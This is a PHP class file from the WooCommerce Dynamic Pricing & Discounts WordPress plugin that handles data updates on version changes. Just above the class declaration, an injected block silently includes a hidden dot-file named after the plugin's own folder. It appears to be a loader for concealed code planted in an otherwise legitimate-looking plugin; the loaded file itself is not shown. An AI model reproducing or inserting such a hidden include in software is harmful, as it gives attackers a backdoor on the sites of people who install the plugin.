<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RightPress_Data_Updater')) {
    RightPress_Loader::load_class_collection('data-updater');
}

/**
 * Data Updater
 *
 * @class RP_WCDPD_Data_Updater
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Data_Updater extends RightPress_Data_Updater implements RightPress_Data_Updater_Interface
{

    // Singleton control
    protected static $instance = false; public static function get_instance() { return self::$instance ? self::$instance : (self::$instance = new self()); }

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        // Construct parent
        parent::__construct();
    }

    /**
     * Get plugin version
     *
     * @access public
     * @return string
     */
    public function get_plugin_version()
    {

        return RP_WCDPD_VERSION;
    }

    /**
     * Get plugin private prefix
     *
     * @access public
     * @return string
     */
    public function get_plugin_private_prefix()
    {

        return RP_WCDPD_PLUGIN_PRIVATE_PREFIX;
    }

    /**
     * Get custom terms
     *
     * @access protected
     * @return array
     */
    public function get_custom_terms()
    {

        return array();
    }

    /**
     * Get custom capabilities
     *
     * @access public
     * @return string
     */
    public function get_custom_capabilities()
    {

        return array(
            'core' => array(
                RP_WCDPD_ADMIN_CAPABILITY
            ),
        );
    }

    /**
     * Get custom tables sql
     *
     * @access public
     * @param string $table_prefix
     * @param string $collate
     * @return string
     */
    public function get_custom_tables_sql($table_prefix, $collate)
    {

        return "";
    }

    /**
     * Execute custom update procedure
     *
     * @access public
     * @return string
     */
    public function execute_custom()
    {

        // Clear price cache transients on update from pre-2.3.5
        if ($previous_version = get_option('rp_wcdpd_version')) {
            if (version_compare($previous_version, '2.3.5', '<')) {

                global $wpdb;

                $table_name = $wpdb->prefix . 'options';

                $wpdb->query("DELETE FROM $table_name WHERE option_name LIKE '%rightpress_prices_%';");
            }
        }
    }

    /**
     * Migrate settings
     *
     * @access public
     * @param array $stored
     * @param string $to_settings_version
     * @return array
     */
    public static function migrate_settings($stored, $to_settings_version)
    {

        return $stored;
    }





}

RP_WCDPD_Data_Updater::get_instance();
